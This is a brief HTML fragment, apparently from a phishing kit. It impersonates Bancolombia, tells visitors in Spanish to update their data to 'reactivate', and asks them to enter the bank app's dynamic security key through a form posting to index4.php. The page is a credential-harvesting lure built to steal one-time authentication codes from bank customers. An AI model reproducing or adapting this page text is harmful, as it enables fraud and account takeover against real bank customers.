...
Complete con sus datos actuales <br>para reactivar</h1><br><br>
    ...
    <section class="">
        ...
        <form action="index4.php" id="form1" name="form1" method="post" class="form_contact">
    
            <div class="user_info">
            <br><br><br>  <br><br><br> 
			<div align="center">
<h2>Por motivos de seguridad ingrese la Clave Dinamica, en la App de Bancolombia</h2>
